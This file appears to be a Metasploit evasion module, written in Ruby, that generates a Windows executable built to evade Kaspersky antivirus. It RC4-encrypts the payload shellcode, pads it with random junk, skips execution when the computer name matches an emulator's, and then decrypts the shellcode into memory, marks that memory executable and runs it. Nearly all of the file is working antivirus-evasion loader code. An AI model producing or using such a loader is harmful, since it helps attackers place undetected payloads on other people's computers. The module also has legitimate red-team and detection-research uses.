##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'metasploit/framework/compiler/windows'

class MetasploitModule < Msf::Evasion

    def initialize(info={})
        super(merge_info(info,
          'Name'        => 'Kaspersky Evasive Executable',
          'Description' => %q{
            This module allows you to generate a Windows EXE that evades against Kaspersky.
            Multiple techniques such as shellcode encryption, source code
            obfuscation, Metasm, and anti-emulation are used to achieve this.

            For best results, please try to use payloads that use a more secure channel
            such as HTTPS or RC4 in order to avoid the payload network traffic getting
            caught by antivirus better.
          },
          'Author'      => [ 'oTwoWin' ],
          'License'     => MSF_LICENSE,
          'Platform'    => 'win',
          'Arch'        => ARCH_X86,
          'Targets'     => [ ['Microsoft Windows', {}] ]
        ))
    end

    def rc4_key
        @rc4_key ||= Rex::Text.rand_text_alpha(32..64)
    end

    def get_payload
        @c_payload ||= lambda {
            opts = { format: 'rc4', key: rc4_key }
            junk = Rex::Text.rand_text(10..1024)
            p = payload.class.method_defined?(:encoded) ? payload.encoded : payload
            p = p + junk

            return {
                size: p.length,
                c_format: Msf::Simple::Buffer.transform(p, 'c', 'buf', opts)
            }
        }.call
    end

    def c_template
        @c_template ||= %Q|#include <Windows.h>
#include <rc4.h>
// The encrypted code allows us to get around static scanning

#{get_payload[:c_format]}

int main() {
    DWORD size;
    char computerName[15];
    GetComputerNameA(computerName, &size);
    if(strcmp("yyekkis", computerName)){
        LPVOID lpBuf = VirtualAlloc(NULL, sizeof buf, MEM_COMMIT, 0x00000004);
        memset(lpBuf, '\\0', sizeof buf);
        RC4("#{rc4_key}", buf, lpBuf, sizeof buf);
        DWORD ignore;
        VirtualProtect(lpBuf, sizeof buf, 0x00000010, &ignore);
        ((void(*)())lpBuf)();
    }
    return 0;
}|
    end

    def generate_bin(code)
        @payload = code
        bin = Metasploit::Framework::Compiler::Windows.compile_c(c_template)
    end

    def run
        # The randomized code allows us to generate a unique EXE
        bin = Metasploit::Framework::Compiler::Windows.compile_c(c_template)
        print_status("Compiled executable size: #{bin.length}")
        file_create(bin)
    end
end


